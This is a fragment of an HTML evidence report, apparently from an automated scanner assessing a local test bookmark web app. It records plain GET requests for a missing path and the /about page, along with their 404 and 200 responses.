+<div class="ev"><div class="evh">Evidence <code>ev-mqyt5ekx-1w</code> — <code>artifacts/s-0003/ev-mqyt5ekx-1w/</code></div><div class="lbl">REQUEST</div><pre>GET /nonexistent-path-12345 HTTP/1.1
+Host: target.local:32841
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 207
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 05:59:21 GMT
+expires: 0
+keep-alive: timeout=5, max=100
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyt4enw-1v</code> — <code>artifacts/s-0003/ev-mqyt4enw-1v/</code></div><div class="lbl">REQUEST</div><pre>GET /about HTTP/1.1
+Host: target.local:32841
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 1345
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 05:58:35 GMT
+expires: 0
+keep-alive: timeout=5, max=100
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+vary: Accept-Encoding
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;About us&lt;/title&gt;
+    &lt;link href=&quot;/static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row justify-content-between mt-5&quot;&gt;
+            &lt;div class=&quot;col-md-9&quot;&gt;
+                &lt;h2&gt;Welcome to the best URL bookmarks application ever seen.&lt;/h2&gt;
+                &lt;p&gt;Here you can check and add new URLs to this online bookmark app&lt;/p&gt;
+                &lt;p&gt;If you believe this application is useful, please share it&lt;/p&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;col-md-3&quot;&gt;
+                &lt;div class=&quot;card&quot;&gt;
+                    &lt;div class=&quot;card-body&quot;&gt;
+                        &lt;h5 class=&quot;card-title&quot;&gt;Navigation&lt;/h5&gt;
+                        &lt;ul class=&quot;list-group&quot;&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/list&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/add&quot;&gt;Bookmark URL&lt;/a&gt;&lt;/li&gt;
+                        &lt;/ul&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap Bundle with Popper --&gt;
+    &lt;script src=&quot;/static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyt5evb-1x</code> — <code>artifacts/s-0003/ev-mqyt5evb-1x/</code></div><div class="lbl">REQUEST</div><pre>GET /about HTTP/1.1
+Host: target.local:32841
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 1345
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 05:59:22 GMT
+expires: 0
+keep-alive: timeout=5, max=99
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+vary: Accept-Encoding
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;About us&lt;/title&gt;
+    &lt;link href=&quot;/static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row justify-content-between mt-5&quot;&gt;
+            &lt;div class=&quot;col-md-9&quot;&gt;
+                &lt;h2&gt;Welcome to the best URL bookmarks application ever seen.&lt;/h2&gt;
+                &lt;p&gt;Here you can check and add new URLs to this online bookmark app&lt;/p&gt;
+                &lt;p&gt;If you believe this application is useful, please share it&lt;/p&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;col-md-3&quot;&gt;
+                &lt;div class=&quot;card&quot;&gt;
+                    &lt;div class=&quot;card-body&quot;&gt;
+                        &lt;h5 class=&quot;card-title&quot;&gt;Navigation&lt;/h5&gt;
+                        &lt;ul class=&quot;list-group&quot;&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/list&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/add&quot;&gt;Bookmark URL&lt;/a&gt;&lt;/li&gt;
+                        &lt;/ul&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap Bundle with Popper --&gt;
+    &lt;script src=&quot;/static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+</body></html>
